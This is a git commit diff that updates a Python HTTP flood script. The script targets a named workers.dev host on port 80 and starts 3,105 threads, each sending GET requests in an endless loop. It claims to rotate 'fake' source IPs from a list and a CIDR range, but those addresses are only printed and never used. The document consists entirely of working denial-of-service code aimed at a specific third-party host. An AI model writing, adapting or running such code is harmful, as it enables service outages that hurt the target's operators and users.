6fb36da37566ce5c0aaa1cfe94fd652647fd4250
Sonywahyupratama <142053324+Sonywahyupratama@users.noreply.github.com>
2023-09-17 06:32:14 +0700

    Update p.py

--- p.py
+++ p.py
@@ -1,71 +1,51 @@
 import socket
 import random
 import threading
+import ipaddress
 
 # Define the target server and port
-target = "38.242.194.12"
+target = "sayu-files.tg-index.workers.dev"
 port = 80  # HTTP typically uses port 80
 
-# Define the first fake IP address
-fake_ip1 = "20.205.61.143"
+# Define the CIDR subnet range
+subnet = ipaddress.IPv4Network('115.66.0.0/16', strict=False)
 
-# Function to send HTTP GET requests with the first fake IP
-def send_request_with_fake_ip1():
+# Define a list of fake IP addresses
+fake_ips = ["20.205.61.143", "103.84.206.169", "101.37.18.10"]
+
+# Function to generate fake IP addresses within the CIDR range
+def generate_fake_ips(subnet, count):
+    fake_ips = []
+    for _ in range(count):
+        fake_ip = str(random.choice(list(subnet.hosts())))
+        fake_ips.append(fake_ip)
+    return fake_ips
+
+# Generate fake IPs within the CIDR range
+generated_fake_ips = generate_fake_ips(subnet, 10)  # Generate 10 fake IPs
+
+# Function to send HTTP GET requests with a random fake IP
+def send_request_with_random_fake_ip():
     while True:
         try:
+            # Randomly select either from generated_fake_ips or fake_ips
+            fake_ip = random.choice(generated_fake_ips + fake_ips)
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
             s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
             s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
             s.close()
-            print(f"Sent request with fake IP: {fake_ip1}")
+            print(f"Sent request with fake IP: {fake_ip}")
         except Exception as e:
             print("An error occurred:", str(e))
 
-# Define the second fake IP address
-fake_ip2 = "103.84.206.169"
-
-# Function to send HTTP GET requests with the second fake IP
-def send_request_with_fake_ip2():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
-            s.close()
-            print(f"Sent request with fake IP: {fake_ip2}")
-        except Exception as e:
-            print("An error occurred:", str(e))
-
-# Define the third fake IP address
-fake_ip3 = "101.37.18.10"
-
-# Function to send HTTP GET requests with the third fake IP
-def send_request_with_fake_ip3():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
-            s.close()
-            print(f"Sent request with fake IP: {fake_ip3}")
-        except Exception as e:
-            print("An error occurred:", str(e))
-
-# Create and start 10 threads for each function
+# Create and start threads for sending requests
 threads = []
-for _ in range(100):
-    thread1 = threading.Thread(target=send_request_with_fake_ip1)
-    thread2 = threading.Thread(target=send_request_with_fake_ip2)
-    thread3 = threading.Thread(target=send_request_with_fake_ip3)
-    thread1.start()
-    thread2.start()
-    thread3.start()
-    threads.append(thread1)
-    threads.append(thread2)
-    threads.append(thread3)
+for _ in range(3105):
+    thread = threading.Thread(target=send_request_with_random_fake_ip)
+    thread.start()
+    threads.append(thread)
 
 # Wait for all threads to finish (you can modify this logic as needed)
 for thread in threads:
